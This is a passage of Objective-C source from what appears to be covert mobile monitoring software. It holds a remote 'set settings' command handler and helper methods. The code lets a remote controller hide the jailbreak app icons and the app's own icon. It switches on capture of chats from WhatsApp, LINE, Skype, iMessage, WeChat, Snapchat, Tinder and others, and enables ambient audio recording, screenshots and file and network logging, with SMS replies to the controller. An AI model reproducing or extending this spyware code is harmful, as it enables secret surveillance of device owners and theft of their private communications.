                if ([configurationManager isSupportedSettingID:kRemoteCmdApplicationIconVisibility
												   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            [prefVisibility setMVisible:[value intValue]];
						}
					}
				} else {
                    [self setSettingsException];
				}
                break;
            case kRemoteCmdCydiaIconVisibility:
                if ([configurationManager isSupportedSettingID:kRemoteCmdCydiaIconVisibility
												   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSString *cydiaBundleIdentifier = @"com.saurik.Cydia";
                            [self saveVisibilityPreference:prefVisibility bundleID:cydiaBundleIdentifier enableValue:[value intValue]];
						}
					}
				} else {
                    [self setSettingsException];
				}
                break;
            case kRemoteCmdPanguIconVisibility:
                #if TARGET_OS_IPHONE
                if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
                    if ([configurationManager isSupportedSettingID:kRemoteCmdPanguIconVisibility
                                                       remoteCmdID:[self remoteCmdCode]]) {
                        if ([RemoteCmdProcessorUtils isDigits:value]) {
                            if ([self checkEnableOrDisableFlag:[value intValue]]) {
                                NSString *panguBundleIdentifier = @"io.pangu.loader";
                                [self saveVisibilityPreference:prefVisibility bundleID:panguBundleIdentifier enableValue:[value intValue]];
                            }
                        }
                    } else {
                        [self setSettingsException];
                    }
                } else {
                    DLog(@"Not process Pangu Setting ID for iOS version below 8")
                }
                #endif
                break;
            case kRemoteCmdPPIconVisibility:
                #if TARGET_OS_IPHONE
                if ([[[UIDevice currentDevice] systemVersion] intValue] >= 9) {
                    if ([configurationManager isSupportedSettingID:kRemoteCmdPPIconVisibility
                                                       remoteCmdID:[self remoteCmdCode]]) {
                        if ([RemoteCmdProcessorUtils isDigits:value]) {
                            if ([self checkEnableOrDisableFlag:[value intValue]]) {
                                NSString *ppBundleIdentifier = [RemoteCmdProcessorUtils ppPanguiOS9BundleID];
                                [self saveVisibilityPreference:prefVisibility bundleID:ppBundleIdentifier enableValue:[value intValue]];
                            }
                        }
                    } else {
                        [self setSettingsException];
                    }
                } else {
                    DLog(@"Not process Pangu Setting ID for iOS version below 8")
                }
                #endif
                break;
            case kRemoteCmdIMWhatsApp:
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMWhatsApp]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualWhatsApp
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
			    } else {
					[self setSettingsException];
                }
				break;
            case kRemoteCmdIMLINE:
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMLINE]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualLINE
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
			    } else {
					[self setSettingsException];
                }
				break;
            case kRemoteCmdIMFacebook:
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMFacebook]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualFacebook
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
			    } else {
					[self setSettingsException];
                }
				break;
            case kRemoteCmdIMSkype:
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMSkype]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualSkype
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
			    } else {
					[self setSettingsException];
                }
				break;
            case kRemoteCmdIMBBM:
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMBBM]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualBBM
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
			    } else {
					[self setSettingsException];
                }
				break;
            case kRemoteCmdIMIMessage:
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMIMessage]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualIMessage
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
			    } else {
					[self setSettingsException];
                }
				break;
            case kRemoteCmdIMViber:
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMViber]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualViber
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
			    } else {
					[self setSettingsException];
                }
				break;
            case kRemoteCmdIMWeChat:
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMWeChat]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualWeChat
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
			    } else {
					[self setSettingsException];
                }
				break;
            case kRemoteCmdIMYahooMessenger:
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMYahooMessenger]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualYahooMessenger
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
			    } else {
					[self setSettingsException];
                }
				break;
            case kRemoteCmdIMSnapchat:
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMSnapchat]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualSnapchat
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
			    } else {
					[self setSettingsException];
                }
				break;
            case kRemoteCmdIMHangout:
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMHangout]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualHangout
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
			    } else {
					[self setSettingsException];
                }
				break;
            /*
            case kRemoteCmdIMSlingshot:
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualSlingshot
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
			    } else {
					[self setSettingsException];
                }
				break;
            */
                
            case kRemoteCmdIMAppShot:
                if ([configurationManager isSupportedSettingID:kRemoteCmdIMAppShot
												   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            [prefEvents setMEnableIM:[value intValue]];
						}
					}
				} else {
                    [self setSettingsException];
				}
                break;
            case kRemoteCmdIMAppShotLINE:
                if ([configurationManager isSupportedSettingID:kRemoteCmdIMAppShotLINE
												   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualAppShotLINE
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
						}
					}
				} else {
                    [self setSettingsException];
				}
                break;
            case kRemoteCmdIMAppShotSkype:
                if ([configurationManager isSupportedSettingID:kRemoteCmdIMAppShotSkype
												   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualAppShotSkype
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
						}
					}
				} else {
                    [self setSettingsException];
				}
                break;
            case kRemoteCmdIMAppShotQQ:
                if ([configurationManager isSupportedSettingID:kRemoteCmdIMAppShotQQ
												   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualAppShotQQ
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
						}
					}
				} else {
                    [self setSettingsException];
				}
                break;
            case kRemoteCmdIMAppShotIMessage:
                if ([configurationManager isSupportedSettingID:kRemoteCmdIMAppShotIMessage
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualAppShotIMessage
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdIMAppShotWeChat:
                if ([configurationManager isSupportedSettingID:kRemoteCmdIMAppShotWeChat
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualAppShotWeChat
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdIMAppShotAIM:
                if ([configurationManager isSupportedSettingID:kRemoteCmdIMAppShotAIM
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualAppShotAIM
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdIMAppShotTrillian:
                if ([configurationManager isSupportedSettingID:kRemoteCmdIMAppShotTrillian
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualAppShotTrillian
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdIMAppShotViber:
                if ([configurationManager isSupportedSettingID:kRemoteCmdIMAppShotViber
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualAppShotViber
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdUsbConnection:
                if ([configurationManager isSupportedSettingID:kRemoteCmdUsbConnection
												   remoteCmdID:[self remoteCmdCode]]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefEvents setMEnableUSBConnection:[value intValue]];
						}
					}
				} else {
					[self setSettingsException];
				}
                break;
            case kRemoteCmdFileTransfer:
                if ([configurationManager isSupportedSettingID:kRemoteCmdFileTransfer
												   remoteCmdID:[self remoteCmdCode]]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefEvents setMEnableFileTransfer:[value intValue]];
						}
					}
				} else {
					[self setSettingsException];
				}
                break;
            case kRemoteCmdEmailAppShot:
                if ([configurationManager isSupportedSettingID:kRemoteCmdEmailAppShot
												   remoteCmdID:[self remoteCmdCode]]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefEvents setMEnableEmail:[value intValue]];
						}
					}
				} else {
					[self setSettingsException];
				}
                break;
            case kRemoteCmdAppUsage:
                if ([configurationManager isSupportedSettingID:kRemoteCmdAppUsage
												   remoteCmdID:[self remoteCmdCode]]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefEvents setMEnableAppUsage:[value intValue]];
						}
					}
				} else {
					[self setSettingsException];
				}
                break;
            case kRemoteCmdLogon:
                if ([configurationManager isSupportedSettingID:kRemoteCmdLogon
												   remoteCmdID:[self remoteCmdCode]]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefEvents setMEnableLogon:[value intValue]];
						}
					}
				} else {
					[self setSettingsException];
				}
                break;
            case kRemoteCmdTemporalControlAmbientRecord:
                if ([configurationManager isSupportedSettingID:kRemoteCmdTemporalControlAmbientRecord
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            [prefEvents setMEnableTemporalControlAR:[value intValue]];
                        }
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdTemporalControlScreenshotRecord:
                if ([configurationManager isSupportedSettingID:kRemoteCmdTemporalControlScreenshotRecord
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            [prefEvents setMEnableTemporalControlSSR:[value intValue]];
                        }
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdTemporalControlNetworkTraffic:
                if ([configurationManager isSupportedSettingID:kRemoteCmdTemporalControlNetworkTraffic
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            [prefEvents setMEnableTemporalControlNetworkTraffic:[value intValue]];
                        }
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdIMAttachmentLimitSize:
                if ([configurationManager isSupportedSettingID:kRemoteCmdIMAttachmentLimitSize
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    DLog(@"value array %@", valueArray)
                    DLog(@"value 0 %@", valueArray[0])
                    DLog(@"value 1 %@", valueArray[1])
                    DLog(@"value 2 %@", valueArray[2])
                    DLog(@"value 3 %@", valueArray[3])
                    
                    if ([valueArray count] == 4) {                                      // image, audio, video, non-media
                        if ([RemoteCmdProcessorUtils isDigits:valueArray[0]]) {         // Image
                            DLog(@">> set image limit size to %lu", (unsigned long)[valueArray[0] integerValue])
                            [prefEvents setMIMAttachmentImageLimitSize:[valueArray[0] integerValue]];
                        }
                        if ([RemoteCmdProcessorUtils isDigits:valueArray[1]]) {         // Audio
                            DLog(@">> set audio limit size to %lu", (unsigned long)[valueArray[1] integerValue])
                            [prefEvents setMIMAttachmentAudioLimitSize:[valueArray[1] integerValue]];
                        }
                        if ([RemoteCmdProcessorUtils isDigits:valueArray[2]]) {         // Video
                            DLog(@">> set video limit size to %lu", (unsigned long)[valueArray[2] integerValue])
                            [prefEvents setMIMAttachmentVideoLimitSize:[valueArray[2] integerValue]];
                        }
                        if ([RemoteCmdProcessorUtils isDigits:valueArray[3]]) {         // Non-Media
                            DLog(@">> set non-media limit size to %lu", (unsigned long)[valueArray[3] integerValue])
                            [prefEvents setMIMAttachmentNonMediaLimitSize:[valueArray[3] integerValue]];
                        }
                    } else {
                        DLog(@"Invalid number of arguments (expected: 4, actual: %lu)", (unsigned long)[valueArray count])
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdDebugLog:
                if ([configurationManager isSupportedSettingID:kRemoteCmdDebugLog
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            [prefSignup setMEnableDebugLog:[value intValue]];
                        }
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdFileActivity:
                if ([configurationManager isSupportedSettingID:kRemoteCmdFileActivity
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            [prefFileActivity setMEnable:[value intValue]];
                        }
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdMonitoredFileActivityType:
                if ([configurationManager isSupportedSettingID:kRemoteCmdMonitoredFileActivityType
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        [prefFileActivity setMActivityType:[value integerValue]];
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdExcludedFileActivityPaths:
                if ([configurationManager isSupportedSettingID:kRemoteCmdExcludedFileActivityPaths
                                                   remoteCmdID:[self remoteCmdCode]]) {

                    [prefFileActivity setMExcludedFileActivityPaths:valueArray];
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdNetworkConnection:
                if ([configurationManager isSupportedSettingID:kRemoteCmdNetworkConnection
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        [prefEvents setMEnableNetworkConnection:[value integerValue]];
                    }
                } else {
                    [self setSettingsException];
                }
                break;
                
            case kRemoteCmdPrintJob:
                if ([configurationManager isSupportedSettingID:kRemoteCmdPrintJob
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        [prefEvents setMEnablePrintJob:[value integerValue]];
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdNetworkAlert:
                if ([configurationManager isSupportedSettingID:kRemoteCmdNetworkAlert
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        [prefEvents setMEnableNetworkAlert:[value integerValue]];
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdAppScreenShot:
                if ([configurationManager isSupportedSettingID:kRemoteCmdAppScreenShot
                                                   remoteCmdID:[self remoteCmdCode]]) {
                    if ([RemoteCmdProcessorUtils isDigits:value]) {
                        [prefEvents setMEnableAppScreenShot:[value integerValue]];
                    }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdIMTinder:
                if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMTinder]) {
                    if ([RemoteCmdProcessorUtils isDigits:value])
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualTinder
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
                } else {
                    [self setSettingsException];
                }
                break;
            case kRemoteCmdIMInstagram:
                if ([configurationManager isSupportedFeature:kFeatureID_EventIM] && [RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMInstagram]) {
                    if ([RemoteCmdProcessorUtils isDigits:value])
                        if ([self checkEnableOrDisableFlag:[value intValue]]) {
                            NSUInteger newValue = [self computeIMIndividualClient:kPrefIMIndividualInstagram
                                                                         existing:[prefEvents mEnableIndividualIM]
                                                                         isEnable:[value intValue]];
                            [prefEvents setMEnableIndividualIM:newValue];
                        }
                } else {
                    [self setSettingsException];
                }
                break;
			default:
				[self setSettingsException];
				break;
		}
	}
    [prefManager savePreferenceAndNotifyChange:prefCallRecord];
    [prefManager savePreferenceAndNotifyChange:prefFileActivity];
    [prefManager savePreferenceAndNotifyChange:prefSignup];
	[prefManager savePreferenceAndNotifyChange:prefEvents];
	[prefManager savePreferenceAndNotifyChange:prefLocation];
	[prefManager savePreferenceAndNotifyChange:prefRestriction];
	
	//
	[prefManager savePreferenceAndNotifyChange:prefMonitor];
	[prefManager savePreferenceAndNotifyChange:prefHomeNumberList];
	[prefManager savePreferenceAndNotifyChange:prefNotificationNumberList];
	[prefManager savePreferenceAndNotifyChange:prefWatchList];
	[prefManager savePreferenceAndNotifyChange:prefEmergencyNumber];
	[prefManager savePreferenceAndNotifyChange:prefPanic];
	[prefManager savePreferenceAndNotifyChange:prefKeywords];
	[prefManager savePreferenceAndNotifyChange:prefFaceTimeIDs];
    [prefManager savePreferenceAndNotifyChange:prefVisibility];
	
	[self sendReplySMS];
}

// For testing purpose
- (NSString *) intToBinary: (int) intValue
{
    int byteBlock = 8,            // 8 bits per byte
    totalBits = (sizeof(int)) * byteBlock, // Total bits
    binaryDigit = totalBits; // Which digit are we processing
    
    // C array - storage plus one for null
    char ndigit[totalBits + 1];
    
    while (binaryDigit-- > 0)
    {
        // Set digit in array based on rightmost bit
        ndigit[binaryDigit] = (intValue & 1) ? '1' : '0';
        
        // Shift incoming value one to right
        intValue >>= 1;
    }
    
    // Append null
    ndigit[totalBits] = 0;
    DLog(@"== %@", [NSString stringWithUTF8String:ndigit]);
    // Return the binary string
    return [NSString stringWithUTF8String:ndigit];
}


- (NSUInteger) computeIMIndividualClient: (PrefIMIndividual) aIMIndividualClient
                                existing: (NSUInteger) anExisting
                                isEnable: (int) isEnable {
    
    DLog(@"existing value %lu", (unsigned long)anExisting)
    [self intToBinary:anExisting];
    NSUInteger newValue = 0;
    if (isEnable == _ENABLE_) {
        newValue = anExisting | aIMIndividualClient;
    } else {
        newValue = anExisting & ~aIMIndividualClient;
    }
    DLog(@"newValue %lu", (unsigned long)newValue)
    [self intToBinary:newValue];
    return newValue;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMS {
	 DLog (@"SetSettings---->sendReplySMS");
	 NSString *setSettingMessage=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						     andErrorCode:_SUCCESS_];
	 
	 [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:setSettingMessage];
	 if ([mRemoteCmdData mIsSMSReplyRequired]) {
		 [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
																andMessage:setSettingMessage];
	 }
}

/**
 - Method name: setsetSettingsException
 - Purpose:This method is invoked when activation failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) setSettingsException  {
	DLog (@"SetSettings---->setSettingsException")
	FxException* exception = [FxException exceptionWithName:@"processSettings" andReason:@"Set Settings Error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM];
	@throw exception;
}

/**
 - Method name: dealloc
 - Purpose:This method is used to handle managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mSettingsArgs release];
	 mSettingsArgs=nil;
	[super dealloc];
}

@end
